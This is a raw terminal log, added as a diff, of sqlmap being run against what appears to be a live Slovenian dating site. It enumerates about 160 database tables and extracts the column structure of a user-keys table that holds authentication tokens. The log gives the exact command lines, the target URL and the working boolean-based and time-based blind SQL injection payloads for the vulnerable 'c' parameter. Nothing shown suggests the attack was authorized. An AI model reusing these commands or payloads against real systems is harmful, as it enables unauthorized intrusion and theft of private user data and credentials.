@@ -1,0 +1,491 @@
+23:39:29] [INFO] fetching number of tables for database 'kiraly_mojpr'
+[23:39:29] [INFO] resumed: 160
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 18
+[23:39:29] [INFO] resumed: m0jp4_associations
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 17
+[23:39:29] [INFO] resumed: m0jp4_ak_profiles
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 16
+[23:39:29] [INFO] resumed: m0jp4_user_notes
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_terms1
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 21
+[23:39:29] [INFO] resumed: m0jp4_partner_answers
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 18
+[23:39:29] [INFO] resumed: m0jp4_finder_terms
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_admintools_profiles
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 18
+[23:39:29] [INFO] resumed: m0jp4_update_sites
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 26
+[23:39:29] [INFO] resumed: m0jp4_admintools_redirects
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 13
+[23:39:29] [INFO] resumed: m0jp4_modules
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_terms8
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 27
+[23:39:29] [INFO] resumed: m0jp4_admintools_tempsupers
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_terms6
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 21
+[23:39:29] [INFO] resumed: m0jp4_partner_ratings
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 20
+[23:39:29] [INFO] resumed: m0jp4_partner_values
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 20
+[23:39:29] [INFO] resumed: m0jp4_redirect_links
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 20
+[23:39:29] [INFO] resumed: m0jp4_partner_hidden
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 22
+[23:39:29] [INFO] resumed: m0jp4_privacy_requests
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 19
+[23:39:29] [INFO] resumed: m0jp4_partner_plans
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 16
+[23:39:29] [INFO] resumed: m0jp4_extensions
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 10
+[23:39:29] [INFO] resumed: m0jp4_tags
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 19
+[23:39:29] [INFO] resumed: m0jp4_fields_values
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_partner_memberships
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 29
+[23:39:29] [INFO] resumed: m0jp4_partner_supportmessages
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 13
+[23:39:29] [INFO] resumed: m0jp4_content
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 14
+[23:39:29] [INFO] resumed: m0jp4_ucm_base
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_partner_regreminder
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 19
+[23:39:29] [INFO] resumed: m0jp4_finder_tokens
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 28
+[23:39:29] [INFO] resumed: m0jp4_partner_signupreminder
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 16
+[23:39:29] [INFO] resumed: m0jp4_categories
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 37
+[23:39:29] [INFO] resumed: m0jp4_partner_messages_threads_unread
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 31
+[23:39:29] [INFO] resumed: m0jp4_partner_image_approval_bu
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 13
+[23:39:29] [INFO] resumed: m0jp4_updates
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 34
+[23:39:29] [INFO] resumed: m0jp4_partner_messages_threads_old
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_contentitem_tag_map
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 28
+[23:39:29] [INFO] resumed: m0jp4_action_logs_extensions
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 28
+[23:39:29] [INFO] resumed: m0jp4_admintools_customperms
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 27
+[23:39:29] [INFO] resumed: m0jp4_admintools_filescache
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 23
+[23:39:29] [INFO] resumed: m0jp4_partner_usernotes
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 19
+[23:39:29] [INFO] resumed: m0jp4_content_types
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 23
+[23:39:29] [INFO] resumed: m0jp4_partner_sent_wink
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 19
+[23:39:29] [INFO] resumed: m0jp4_user_profiles
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 30
+[23:39:29] [INFO] resumed: m0jp4_partner_mailer_blacklist
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 30
+[23:39:29] [INFO] resumed: m0jp4_partner_dailysuggestions
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 22
+[23:39:29] [INFO] resumed: m0jp4_partner_comments
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 26
+[23:39:29] [INFO] resumed: m0jp4_admintools_ipautoban
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 19
+[23:39:29] [INFO] resumed: m0jp4_partner_promo
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 29
+[23:39:29] [INFO] resumed: m0jp4_finder_tokens_aggregate
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_terms3
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 24
+[23:39:29] [INFO] resumed: m0jp4_partner_helppanels
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 20
+[23:39:29] [INFO] resumed: m0jp4_partner_orders
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 17
+[23:39:29] [INFO] resumed: m0jp4_ucm_history
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 16
+[23:39:29] [INFO] resumed: m0jp4_usergroups
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 24
+[23:39:29] [INFO] resumed: m0jp4_admintools_cookies
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 18
+[23:39:29] [INFO] resumed: m0jp4_finder_types
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 23
+[23:39:29] [INFO] resumed: m0jp4_content_frontpage
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_termsf
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 27
+[23:39:29] [INFO] resumed: m0jp4_partner_winkquestions
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 29
+[23:39:29] [INFO] resumed: m0jp4_update_sites_extensions
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_partner_customevent
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 20
+[23:39:29] [INFO] resumed: m0jp4_admintools_acl
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 20
+[23:39:29] [INFO] resumed: m0jp4_partner_traits
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 31
+[23:39:29] [INFO] resumed: m0jp4_partner_messages_archived
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_termse
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 15
+[23:39:29] [INFO] resumed: m0jp4_overrider
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_taxonomy_map
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_terms2
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_admintools_badwords
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 31
+[23:39:29] [INFO] resumed: m0jp4_partner_event_impressions
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_terms0
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 22
+[23:39:29] [INFO] resumed: m0jp4_admintools_scans
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 20
+[23:39:29] [INFO] resumed: m0jp4_admintools_log
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_terms4
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 22
+[23:39:29] [INFO] resumed: m0jp4_partner_spammers
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 19
+[23:39:29] [INFO] resumed: m0jp4_banner_tracks
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_partner_hidden_back
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 20
+[23:39:29] [INFO] resumed: m0jp4_banner_clients
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 27
+[23:39:29] [INFO] resumed: m0jp4_partner_adminsettings
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 17
+[23:39:29] [INFO] resumed: m0jp4_action_logs
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 28
+[23:39:29] [INFO] resumed: m0jp4_partner_image_approval
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 18
+[23:39:29] [INFO] resumed: m0jp4_messages_cfg
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 28
+[23:39:29] [INFO] resumed: m0jp4_partner_questionnaires
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 22
+[23:39:29] [INFO] resumed: m0jp4_partner_messages
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 28
+[23:39:29] [INFO] resumed: m0jp4_partner_answers_values
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 23
+[23:39:29] [INFO] resumed: m0jp4_partner_locations
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_terms9
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 21
+[23:39:29] [INFO] resumed: m0jp4_template_styles
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 12
+[23:39:29] [INFO] resumed: m0jp4_fields
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 21
+[23:39:29] [INFO] resumed: m0jp4_partner_coupons
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_partner_custominput
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 15
+[23:39:29] [INFO] resumed: m0jp4_user_keys
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 31
+[23:39:29] [INFO] resumed: m0jp4_partner_messages_treshold
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_termsb
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 24
+[23:39:29] [INFO] resumed: m0jp4_partner_eventtypes
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 22
+[23:39:29] [INFO] resumed: m0jp4_privacy_consents
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 18
+[23:39:29] [INFO] resumed: m0jp4_modules_menu
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 28
+[23:39:29] [INFO] resumed: m0jp4_partner_event_location
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 24
+[23:39:29] [INFO] resumed: m0jp4_user_usergroup_map
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 13
+[23:39:29] [INFO] resumed: m0jp4_banners
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 23
+[23:39:29] [INFO] resumed: m0jp4_fields_categories
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 19
+[23:39:29] [INFO] resumed: m0jp4_akeeba_common
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 26
+[23:39:29] [INFO] resumed: m0jp4_postinstall_messages
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 18
+[23:39:29] [INFO] resumed: m0jp4_finder_links
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 27
+[23:39:29] [INFO] resumed: m0jp4_partner_orders_backup
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_terms7
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 30
+[23:39:29] [INFO] resumed: m0jp4_partner_messages_threads
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_partner_event_likes
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 27
+[23:39:29] [INFO] resumed: m0jp4_admintools_scanalerts
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 21
+[23:39:29] [INFO] resumed: m0jp4_utf8_conversion
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 13
+[23:39:29] [INFO] resumed: m0jp4_schemas
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_links_termsa
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 22
+[23:39:29] [INFO] resumed: m0jp4_partner_mail_log
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 23
+[23:39:29] [INFO] resumed: m0jp4_partner_error_log
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 16
+[23:39:29] [INFO] resumed: m0jp4_ak_storage
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 21
+[23:39:29] [INFO] resumed: m0jp4_partner_aliases
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 21
+[23:39:29] [INFO] resumed: m0jp4_contact_details
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 26
+[23:39:29] [INFO] resumed: m0jp4_partner_messagestats
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 33
+[23:39:29] [INFO] resumed: m0jp4_admintools_ipautobanhistory
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 23
+[23:39:29] [INFO] resumed: m0jp4_core_log_searches
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 26
+[23:39:29] [INFO] resumed: m0jp4_partner_sent_welcome
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 23
+[23:39:29] [INFO] resumed: m0jp4_action_log_config
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 22
+[23:39:29] [INFO] resumed: m0jp4_partner_settings
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 25
+[23:39:29] [INFO] resumed: m0jp4_finder_terms_common
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 26
+[23:39:29] [INFO] resumed: m0jp4_partner_eventsignups
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 24
+[23:39:29] [INFO] resumed: m0jp4_admintools_storage
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 15
+[23:39:29] [INFO] resumed: m0jp4_newsfeeds
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 17
+[23:39:29] [INFO] resumed: m0jp4_ucm_content
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 27
+[23:39:29] [INFO] resumed: m0jp4_partner_preferences_m
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 30
+[23:39:29] [INFO] resumed: m0jp4_partner_ekskluzivnivecer
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 19
+[23:39:29] [INFO] resumed: m0jp4_partner_users
+[23:39:29] [INFO] retrieving the length of query output
+[23:39:29] [INFO] resumed: 27
+[23:39:29] [INFO] resuming partial value: m0jp4_partner_answ
+[23:39:29] [INFO] retrieved: _________
+[23:39:32] [WARNING] reflective value(s) found and filtering out
+[23:39:46] [INFO] retrieved: m0jp4_partner_answers_misc2
+[23:39:46] [INFO] retrieving the length of query output
+[23:39:46] [INFO] retrieved: 22
+[23:40:03] [INFO] retrieved: m0jp4_p_______________ 7/22 (31%)
+[23:40:03] [INFO] waiting for threads to finish (Ctrl+C was pressed)
+[23:40:03] [CRITICAL] user aborted (Ctrl+C was pressed multiple times)
+
+[*] ending @ 23:40:03 /2024-04-24/
+
+galje  sqlmapproject-sqlmap-853cb3f  ♥ 23:40  python .\sqlmap.py  -u "https://www.mojpartner.si/index.php/magazin?c=9" -D kiraly_mojpr -T m0jp4_user_keys --colums --threads=4 --time-sec=1 -o --batch
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.8.4.1#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+Usage: sqlmap.py [options]
+
+sqlmap.py: error: no such option: --colums
+
+Press Enter to continue...
+galje  sqlmapproject-sqlmap-853cb3f  ♥ 23:40  python .\sqlmap.py  -u "https://www.mojpartner.si/index.php/magazin?c=9" -D kiraly_mojpr -T m0jp4_user_keys --columns --threads=4 --time-sec=1 -o --batch
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.8.4.1#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:40:42 /2024-04-24/
+
+[23:40:42] [INFO] resuming back-end DBMS 'mysql'
+[23:40:42] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('3ce97fad442acac0a47c143f03f916c8=omtbsg04s07...7vuk3vdd3o'). Do you want to use those [Y/n] Y
+[23:40:43] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: c (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: c=10 AND 4350=4350
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: c=10 AND (SELECT 6854 FROM (SELECT(SLEEP(1)))MlWu)
+---
+[23:40:43] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 7.4.9, Apache 2
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[23:40:43] [INFO] fetching columns for table 'm0jp4_user_keys' in database 'kiraly_mojpr'
+[23:40:43] [INFO] retrieved:
+[23:40:44] [WARNING] reflective value(s) found and filtering out
+7
+[23:40:48] [INFO] retrieving the length of query output
+[23:40:48] [INFO] retrieved: 2
+[23:40:57] [INFO] retrieved: id
+[23:40:57] [INFO] retrieving the length of query output
+[23:40:57] [INFO] retrieved: 16
+[23:41:21] [INFO] retrieved: int(10) unsigned
+[23:41:21] [INFO] retrieving the length of query output
+[23:41:21] [INFO] retrieved: 7
+[23:41:33] [INFO] retrieved: user_id
+[23:41:33] [INFO] retrieving the length of query output
+[23:41:33] [INFO] retrieved: 12
+[23:41:58] [INFO] retrieved: varchar(150)
+[23:41:58] [INFO] retrieving the length of query output
+[23:41:58] [INFO] retrieved: 5
+[23:42:08] [INFO] retrieved: token
+[23:42:08] [INFO] retrieving the length of query output
+[23:42:08] [INFO] retrieved: 12
+[23:42:28] [INFO] retrieved: varchar(255)
+[23:42:28] [INFO] retrieving the length of query output
+[23:42:28] [INFO] retrieved: 6
+[23:42:40] [INFO] retrieved: series
+[23:42:40] [INFO] retrieving the length of query output
+[23:42:40] [INFO] retrieved: 12
+[23:43:04] [INFO] retrieved: varchar(191)
+[23:43:04] [INFO] retrieving the length of query output
+[23:43:04] [INFO] retrieved: 7
+[23:43:15] [INFO] retrieved: invalid
+[23:43:15] [INFO] retrieving the length of query output
+[23:43:15] [INFO] retrieved: 10
+[23:43:38] [INFO] retrieved: tinyint(4)
+[23:43:38] [INFO] retrieving the length of query output
+[23:43:38] [INFO] retrieved: 4
+[23:43:51] [INFO] retrieved: time
+[23:43:51] [INFO] retrieving the length of query output
+[23:43:51] [INFO] retrieved: 12
+[23:44:10] [INFO] retrieved: varchar(200)
+[23:44:10] [INFO] retrieving the length of query output
+[23:44:10] [INFO] retrieved: 8
